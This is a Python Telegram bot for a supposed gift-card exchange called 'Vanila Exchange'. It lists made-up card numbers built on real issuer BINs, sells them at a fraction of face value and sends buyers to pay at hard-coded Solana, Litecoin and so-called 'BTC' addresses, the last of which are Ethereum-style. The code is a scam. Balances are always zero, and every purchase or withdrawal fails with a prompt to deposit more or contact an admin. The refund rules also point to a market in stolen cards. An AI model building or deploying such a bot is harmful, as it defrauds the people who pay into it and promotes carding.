import os
import random
import time
from datetime import datetime, timedelta, timezone
from flask import Flask
from threading import Thread
import telebot
from telebot import types

# --- Bot Configuration ---
BOT_TOKEN = os.environ.get('BOT_TOKEN', 'YOUR_TELEGRAM_BOT_TOKEN_HERE')
bot = telebot.TeleBot(BOT_TOKEN)

ADMIN_USERNAME = "@Vanilla_Support9"
SUPPORT_USERNAME = "@Vanilla_Support9"
REFUND_SUPPORT_USERNAME = "@Vanilla_Support9"
CARD_CHECKER_USERNAME = "@Vanilla_Support9"

# Web Server setup for UptimeRobot
app = Flask('')

@app.route('/')
def home():
    return "Bot is alive and running!"

def run_web():
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 8080)))

def keep_alive():
    t = Thread(target=run_web)
    t.daemon = True
    t.start()

# --- Crypto Addresses & Rates ---
SOL_ADDRESSES = [
    "6h3TxBcLNTqth4Cy7ho2ZRUWEE913V2DGSMfVzbeuZkN", "G5EEUtKbPjgkrEEi1tmvDsYFK9FrTcmikF2RTEdm5ZL2",
    "2GKnf4AxXTo1KARKTQ8HwktbdhJRQr9RLvKMhzBHtELx", "HeVPqfDWg5KpXdYesqzu1B6p9SPPF2Pdw3WiHePPChTC",
    "AcsnfkSmqPVL9cHn3a86RU9Yh4KZB9kFm83UvcqHXQ2W", "BfXu5j6imZbVRt8HstMVUGvfrtXCoxVixEBjnhsD48x6",
    "274W5X7w6RBX1DEoybKEUxLpnhhTdqD1NqZPZHsEsgiR", "HotYPEqpS41LWFeoJ2uEi8v1L2Gdi6Kz8Hbj271N1HT3",
    "7shWRLyJ3mAv6RZCU6WTp6FqHsu7egpzhs8rZVMLU7Nx", "G9P43VRPcxUssTzSfZUJihk7nTMUrtWL6WnKQFQCxm7H"
]

LTC_ADDRESSES = [
    "ltc1q8u5y45yayhsezjzh9y02xh75h0ek0ja4xhfmqu", "ltc1qks038fn9asrksx6ufja8x2dhhz3f9fkrzkqxuj",
    "ltc1qgxv834ummxxzvee8q8pf03qj9lnltkflkr3zpn", "ltc1qv3yjnclkq6538snvp9yd0h5wdw2mnmjzdns40r",
    "ltc1q7mvj3syqnwjlf0sstxxzj3ee7ktuaxd3867247", "ltc1qhhhmxmmlvwhmzw764uayytxpawrynk9maur5w2",
    "ltc1qtec7v06vrr3ykxz8r0aye0xf2twh477wyaz8h2", "ltc1qaft7vwguyv2ugye4qn6qwhnughs3hw8rvzwdd2",
    "ltc1q7mv4rx0t4cngc8z8ngefcnd6vgfd5ddxxr2ll9", "ltc1qfu2vr2e0cphc4ydfjyecgfj5vftykf2kdj6wns"
]

BTC_ADDRESSES = [
    "0x044ff3fccb6050559c65dec54dd665995096b7ea", "0xe5a3aa9cd32ced24743ac0c448e56e6391703a78",
    "0xc04245313e995f2ad2c9115b41a831d012280882", "0x110fbfb7a63894bc17b3d9aa514ab95e824f4d1f",
    "0x313b8cf4ad18f2325311cd734e0af88bdc2448a6", "0x124f09c9342b6704477410a296a62274943f8d8b",
    "0xc14a373822699ec89e260cfac7bcb65a6a9455da", "0xc8dd1e9c5954317fdda8ec7bd1f0f65ea85b9ed9",
    "0x63761778ffe14c9cde3e7371f21ebcca6257a258", "0x1295d6c6a2f57ae2dea4a7247a6b1781e2d47a36"
]

RATES = {
    "LTC": 71.17,
    "SOL": 145.50,
    "BTC": 64200.00
}

# --- Dummy Cards Generation ---
CARDS_DATA = []
BINS_MAP = {
    "JOKER": ["461126", "533985"],
    "AMEX": ["373778", "377935", "375163"],
    "VANILLA": ["411810", "409758", "520356", "525362", "484718", "545660"],
    "CARDBALANCE": ["428313", "432465", "457824"],
    "WALMART": ["485246"],
    "GIFTCARDMALL": ["451129", "403446", "435880", "511332"]
}

def generate_cards():
    cards = []
    card_id = 1
    all_bins = []
    for category, bin_list in BINS_MAP.items():
        all_bins.extend(bin_list)
    
    for i in range(50):
        bin_num = random.choice(all_bins)
        card_num = f"{bin_num}{random.randint(10000000, 99999999)}"
        bal = random.choice([10, 12, 15, 20, 25, 50, 100, 150, 200])
        is_reg = "Registered" if random.random() > 0.25 else "Unregistered"
        cards.append({
            "id": card_id,
            "card_number": card_num,
            "balance": bal,
            "status": is_reg,
            "stock": True
        })
        card_id += 1
    return cards

CARDS_DATA = generate_cards()

user_custom_amount = {}

# --- Commands ---

@bot.message_handler(commands=['start'])
def start_cmd(message):
    first_name = message.from_user.first_name
    text = f"( ⚡️Welcome {first_name} to Vanila Exchange! ⚡️\n\n" \
           "Sell, Buy, and strike deals in seconds!!\n" \
           "All transactions are secure and transparent.\n" \
           "All types of cards are available here at best rates. Current rate is 35%)"
    
    markup = types.InlineKeyboardMarkup(row_width=2)
    b1 = types.InlineKeyboardButton("🎫 Stock", callback_data="show_stock_page_1")
    b2 = types.InlineKeyboardButton("📞 Contact Admin", url=f"https://t.me/{ADMIN_USERNAME.replace('@','')}")
    b3 = types.InlineKeyboardButton("Card chaker🔎", url=f"https://t.me/{CARD_CHECKER_USERNAME.replace('@','')}")
    b4 = types.InlineKeyboardButton("Refund Support 📱", url=f"https://t.me/{REFUND_SUPPORT_USERNAME.replace('@','')}")
    markup.add(b1, b2, b3, b4)
    bot.send_message(message.chat.id, text, reply_markup=markup)

@bot.message_handler(commands=['listings', 'cents_listing', 'listing'])
def listings_cmd(message):
    show_stock(message.chat.id, page=1)

@bot.message_handler(commands=['profile'])
def profile_cmd(message):
    now_utc = datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S UTC")
    bot_username = bot.get_me().username
    user = message.from_user
    ref_link = f"`https://t.me/{bot_username}?start={user.id}`"
    
    text = f"Vanila Exchange PROFILE\n\n" \
           f"👤 {user.first_name}\n" \
           f"🧠 It is impossible to love and to be wise.\n" \
           f"💬 By: Francis Bacon\n\n" \
           f"🆔 User ID: `{user.id}`\n" \
           f"🔹 Username: @{user.username if user.username else 'N/A'}\n" \
           f"💰 USD Balance: 0.0000000000\n\n" \
           f"📥 Deposits\n• Total USD: 0.0000\n• Last: Never\n\n" \
           f"🛒 Purchases\n• Count: 0\n• USD Spent: $0.00\n• Last Cards:\n  • No cards purchased yet.\n\n" \
           f"👥 Referrals\n• Invited: 0\n• Referred By: {ref_link}\n\n" \
           f"🛠 Permissions\n• Vendor: ❌\n• Re-list: ❌\n\n" \
           f"Last updated: {now_utc}"
    bot.send_message(message.chat.id, text, parse_mode="Markdown")

@bot.message_handler(commands=['ref'])
def ref_cmd(message):
    bot_username = bot.get_me().username
    user_id = message.from_user.id
    ref_link = f"`https://t.me/{bot_username}?start={user_id}`"
    
    text = f"🎉 EXCLUSIVE REFERRAL PROGRAM\n\n" \
           f"Share the excitement with your friends! For every deposit your active referrals make, you will automatically earn a 5% commission.\n\n" \
           f"🔗 Your unique link: {ref_link}\n\n" \
           f"📊 Your Stats\n\n" \
           f"• Total Referrals: 0\n\n" \
           f"• Earnings: $0.00\n\n" \
           f"📌 Program Rules\n\n" \
           f"Earn on First Activity: Your bonus is unlocked after your referral makes their first transaction.\n\n" \
           f"Original Accounts Only: Self-referrals are not eligible for rewards.\n\n" \
           f"Account Integrity: Any fake or fraudulent referrals will lead to a permanent ban."
    bot.send_message(message.chat.id, text, parse_mode="Markdown")

@bot.message_handler(commands=['balance'])
def balance_cmd(message):
    send_balance_info(message.chat.id, message.from_user)

def send_balance_info(chat_id, user):
    now_utc = (datetime.now(timezone.utc) - timedelta(minutes=2)).strftime("%Y-%m-%d %H:%M:%S UTC")
    text = f"Name : {user.first_name}\n" \
           f"ID : `{user.id}`\n" \
           f"Your balance USD : `0.000000`\n" \
           f"Balance last Update : {now_utc}"
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("💰Deposit", callback_data="deposit_start"))
    bot.send_message(chat_id, text, parse_mode="Markdown", reply_markup=markup)

@bot.message_handler(commands=['withdraw'])
def withdraw_cmd(message):
    user = message.from_user
    text = f"💎 Account Details\n" \
           f"👤 Name: {user.first_name}\n" \
           f"🆔 ID: `{user.username if user.username else user.id}`\n" \
           f"💰 Balance: `0.00000` USD"
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("✅Confirm", callback_data="confirm_withdraw"))
    bot.send_message(chat_id=message.chat.id, text=text, parse_mode="Markdown", reply_markup=markup)

@bot.message_handler(commands=['deposit'])
def deposit_cmd(message):
    send_deposit_options(message.chat.id)

def send_deposit_options(chat_id):
    text = "🏦 Vanila Exchange Deposit\n" \
           "―――――――――――――――――――\n" \
           "🪙 Accepted coins\n" \
           "LTC BTC SOL\n" \
           "―――――――――――――――――――\n" \
           "✅ Minimum $15\n" \
           "🕐 Expires : 30 Minutes\n" \
           "⚡ Confirms ~1–2 min\n" \
           "―――――――――――――――――――\n" \
           "⚠️ Send the exact amount to the correct address.\n" \
           "Wrong amount or address = loss of funds.\n" \
           "👇 Select amount:"
    
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton("$30", callback_data="dep_amount_30"),
        types.InlineKeyboardButton("$50", callback_data="dep_amount_50"),
        types.InlineKeyboardButton("$100", callback_data="dep_amount_100"),
        types.InlineKeyboardButton("$500", callback_data="dep_amount_500"),
        types.InlineKeyboardButton("✏️ Custom Amount", callback_data="dep_amount_custom")
    )
    bot.send_message(chat_id, text, reply_markup=markup)

@bot.message_handler(commands=['help'])
def help_cmd(message):
    text = f"If you need help, please contact\n{SUPPORT_USERNAME}"
    bot.send_message(message.chat.id, text)

@bot.message_handler(commands=['refund_rules'])
def refund_rules_cmd(message):
    text = f"⚡️⚡️⚡️ VERY IMPORTANT ⚡️⚡️⚡️\n" \
           f"💳 Vanila Exchange – Refund Policy 💳\n\n" \
           f"✅✅✅ CARD REFUND REQUIREMENTS ✅✅✅\n" \
           f"1️⃣ Refund requests must be submitted within 30 minutes of purchase.\n" \
           f"2️⃣ Refunds are accepted ONLY if the card is stolen or partially used.\n" \
           f"3️⃣ You must have a valid Telegram username set.\n\n" \
           f"💬 Official Refund Support: {REFUND_SUPPORT_USERNAME}\n\n" \
           f"❌❌❌ AUTOMATIC REFUND REJECTIONS ❌❌❌\n" \
           f"🚫 No refund for ReListed cards\n" \
           f"🚫 No refund for cards used with Google / Google Pay\n" \
           f"🚫 No Telegram username = Auto rejection\n\n" \
           f"⚠️ IMPORTANT NOTICE: All cards are checked immediately before delivery\n" \
           f"📩 Need help? Contact support: {SUPPORT_USERNAME}"
    bot.send_message(message.chat.id, text)

# --- Custom Amount Handler ---
@bot.message_handler(func=lambda m: m.chat.id in user_custom_amount and user_custom_amount[m.chat.id] == 'waiting')
def handle_custom_amount_input(message):
    try:
        amount = float(message.text.strip())
        if amount < 15:
            bot.send_message(message.chat.id, "❌ Minimum deposit is $15\n\nTry again with a larger amount.")
        else:
            user_custom_amount[message.chat.id] = amount
            send_coin_selection(message.chat.id, amount)
    except ValueError:
        bot.send_message(message.chat.id, "❌ Invalid amount. Please enter a valid number.")

def send_coin_selection(chat_id, amount):
    text = f"🏦 DEPOSIT ({amount})\n\n" \
           f"🪙 Choose payment coin:\n\n" \
           f"🪙 LTC — Litecoin\n" \
           f"🟣 SOL — Solana\n" \
           f"₿ BTC — Bitcoin"
    
    markup = types.InlineKeyboardMarkup(row_width=3)
    markup.add(
        types.InlineKeyboardButton("₿ BTC", callback_data=f"paycoin_BTC_{amount}"),
        types.InlineKeyboardButton("🟣 SOL", callback_data=f"paycoin_SOL_{amount}"),
        types.InlineKeyboardButton("🪙 LTC", callback_data=f"paycoin_LTC_{amount}")
    )
    bot.send_message(chat_id, text, reply_markup=markup)

# --- Callback Handlers ---
@bot.callback_query_handler(func=lambda call: True)
def callback_listener(call):
    chat_id = call.message.chat.id
    user = call.from_user
    data = call.data

    if data == "deposit_start":
        send_deposit_options(chat_id)

    elif data == "confirm_withdraw":
        msg = bot.send_message(chat_id, "⚙️Checking Balance.....")
        time.sleep(3)
        bot.edit_message_text("⚠️ Your balance is currently empty. Deposit to start withdrawing!", chat_id, msg.message_id)

    elif data.startswith("show_stock_page_"):
        page = int(data.split("_")[-1])
        show_stock(chat_id, page=page)

    elif data.startswith("dep_amount_"):
        val = data.replace("dep_amount_", "")
        if val == "custom":
            user_custom_amount[chat_id] = 'waiting'
            bot.send_message(chat_id, "✏️ Custom Deposit Amount\n\nEnter amount in USD (Minimum $15)\n\nThen choose your coin — address generates instantly.")
        else:
            amt = float(val)
            send_coin_selection(chat_id, amt)

    elif data.startswith("paycoin_"):
        _, coin, amt = data.split("_")
        amt = float(amt)
        process_deposit_invoice(chat_id, user, coin, amt)

    elif data == "show_filters":
        show_filters_menu(chat_id)

    elif data.startswith("filter_"):
        category = data.replace("filter_", "")
        if category == "CLEAR":
            show_stock(chat_id, page=1)
        else:
            show_filtered_cards(chat_id, category)

    elif data.startswith("buy_"):
        card_id = int(data.replace("buy_", ""))
        card = next((c for c in CARDS_DATA if c["id"] == card_id), None)
        if card:
            cost = card["balance"] * 0.36
            text = f"({card_id}) - Listing Information\n\n" \
                   f"Card: {card['card_number']}\n" \
                   f"Balance: ${card['balance']}\n" \
                   f"Purchase Rate: 36%\n" \
                   f"Total Cost: ${cost:.2f}\n" \
                   f"Registration Status: {card['status']}\n" \
                   f"Card Status: Fresh\n\n" \
                   f"Click Confirm to proceed with purchase"
            markup = types.InlineKeyboardMarkup(row_width=2)
            markup.add(
                types.InlineKeyboardButton("⛔ Cencel", callback_data="buy_cancel"),
                types.InlineKeyboardButton("✅ Confirm", callback_data=f"buy_confirm_{card_id}")
            )
            bot.send_message(chat_id, text, reply_markup=markup)

    elif data == "buy_cancel":
        bot.send_message(chat_id, "⛔ Purchase cancelled.")

    elif data.startswith("buy_confirm_"):
        msg = bot.send_message(chat_id, "💰 Verifying your balance...")
        time.sleep(2)
        bot.edit_message_text(f"❌ Insufficient balance. Please deposit funds and try again. OR Please contact with Admin: {ADMIN_USERNAME}", chat_id, msg.message_id)

def show_stock(chat_id, page=1):
    items_per_page = 10
    start_idx = (page - 1) * items_per_page
    end_idx = start_idx + items_per_page
    current_cards = CARDS_DATA[start_idx:end_idx]

    markup = types.InlineKeyboardMarkup(row_width=2)
    for card in current_cards:
        c_btn = types.InlineKeyboardButton(text=card["card_number"], callback_data="noop")
        p_text = "🛒Purchase" if card["stock"] else "⚠️OUT OF STOCK"
        p_btn = types.InlineKeyboardButton(text=p_text, callback_data=f"buy_{card['id']}" if card["stock"] else "noop")
        markup.add(c_btn, p_btn)

    nav_btns = []
    if page > 1:
        nav_btns.append(types.InlineKeyboardButton("Back⬅️", callback_data=f"show_stock_page_{page-1}"))
    if end_idx < len(CARDS_DATA):
        nav_btns.append(types.InlineKeyboardButton("Next➡️", callback_data=f"show_stock_page_{page+1}"))
    if nav_btns:
        markup.add(*nav_btns)

    markup.add(
        types.InlineKeyboardButton("💰Deposit", callback_data="deposit_start"),
        types.InlineKeyboardButton("Refresh🔂", callback_data=f"show_stock_page_{page}"),
        types.InlineKeyboardButton("🔍Filters", callback_data="show_filters")
    )

    bot.send_message(chat_id, f"📋 Card List - Page {page}:", reply_markup=markup)

def show_filters_menu(chat_id):
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton("🔓Unregistered", callback_data="filter_UNREG"),
        types.InlineKeyboardButton("🔐Registered", callback_data="filter_REG"),
        types.InlineKeyboardButton("⚪Vanilla", callback_data="filter_VANILLA"),
        types.InlineKeyboardButton("💠CardBalance", callback_data="filter_CARDBALANCE"),
        types.InlineKeyboardButton("☀️Walmart", callback_data="filter_WALMART"),
        types.InlineKeyboardButton("🛍️ GiftCardMall", callback_data="filter_GIFTCARDMALL"),
        types.InlineKeyboardButton("🎭Joker", callback_data="filter_JOKER"),
        types.InlineKeyboardButton("🟦AMEX", callback_data="filter_AMEX"),
        types.InlineKeyboardButton("🧹Clear Filters", callback_data="filter_CLEAR")
    )
    bot.send_message(chat_id, "🔍 Select Filter Option:", reply_markup=markup)

def show_filtered_cards(chat_id, category):
    filtered = []
    if category == "UNREG":
        filtered = [c for c in CARDS_DATA if c["status"] == "Unregistered" and c["balance"] <= 150][:10]
    elif category == "REG":
        filtered = [c for c in CARDS_DATA if c["status"] == "Registered"][:10]
    elif category in BINS_MAP:
        bins = BINS_MAP[category]
        filtered = [c for c in CARDS_DATA if any(c["card_number"].startswith(b) for b in bins)][:10]

    markup = types.InlineKeyboardMarkup(row_width=2)
    for card in filtered:
        c_btn = types.InlineKeyboardButton(text=card["card_number"], callback_data="noop")
        p_btn = types.InlineKeyboardButton(text="🛒Purchase" if card["stock"] else "⚠️OUT OF STOCK", callback_data=f"buy_{card['id']}" if card["stock"] else "noop")
        markup.add(c_btn, p_btn)

    markup.add(types.InlineKeyboardButton("🧹Clear Filters", callback_data="filter_CLEAR"))
    bot.send_message(chat_id, f"Filtered Results for {category}:", reply_markup=markup)

def process_deposit_invoice(chat_id, user, coin, amount):
    addr_list = SOL_ADDRESSES if coin == "SOL" else (LTC_ADDRESSES if coin == "LTC" else BTC_ADDRESSES)
    address = random.choice(addr_list)
    rate = RATES.get(coin, 100)
    crypto_needed = round(amount / rate, 6)
    
    valid_until = (datetime.now(timezone.utc) + timedelta(minutes=30)).strftime("%H:%M:%S UTC")
    order_num = random.randint(726268, 999999)

    text = f"Send *{coin}* to the address shown below:\n\n" \
           f"📸 Scan the QR code or copy the address to proceed with payment.\n\n" \
           f"🏦 *{coin} Address*: `{address}`\n" \
           f"💎 Currency : *{coin}*\n" \
           f"Deposit Amount : *${amount}*\n" \
           f"Rate used: 1 {coin} ≈ ${rate}\n" \
           f"💸 Send Exactly: `{crypto_needed} {coin}`\n" \
           f"⚠️Only send *{coin}* assets to this address. Other assets will be lost forever.\n" \
           f"Charge ID: `{user.id}`\n" \
           f"Valid till: {valid_until}\n\n" \
           f"More details:\n" \
           f"Payment ID: `{user.id}`\n" \
           f"Order number: `{order_num}`\n\n" \
           f"1. Make sure you deposit the exact value to get the funds. If the value is lower than the invoice value, your funds may not be deposited.\n" \
           f"Any issue, contact @Vanilacardprepaid with your charge ID.\n" \
           f"2. Do not deposit two times to this same address. Only deposit once.\n" \
           f"3. Deposit to this address within 30 Minuets. After 30 Minuets this address is not valid anymore. You will need to create a new deposit by typing /deposit.\n" \
           f"4. If you sent money and are waiting for confirmations, do not create another invoice. Wait for the money to get confirmed.\n" \
           f"5. Your balance will be automatically credited to your account within 2 minutes of your deposit."

    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("✆Contract", url="https://t.me/Vanilacardprepaid"))

    sent_msg = bot.send_message(chat_id, text, parse_mode="Markdown", reply_markup=markup)

    # 31 Minute Expiry Timer Thread
    def expire_task():
        time.sleep(31 * 60)
        try:
            bot.delete_message(chat_id, sent_msg.message_id)
        except:
            pass
        bot.send_message(chat_id, f"⚠️ Your {coin} deposit session has expired! ⌛\nPlease send /deposit to continue. ✨")

    Thread(target=expire_task, daemon=True).start()

if __name__ == "__main__":
    keep_alive()
    print("Bot started...")
    bot.infinity_polling()
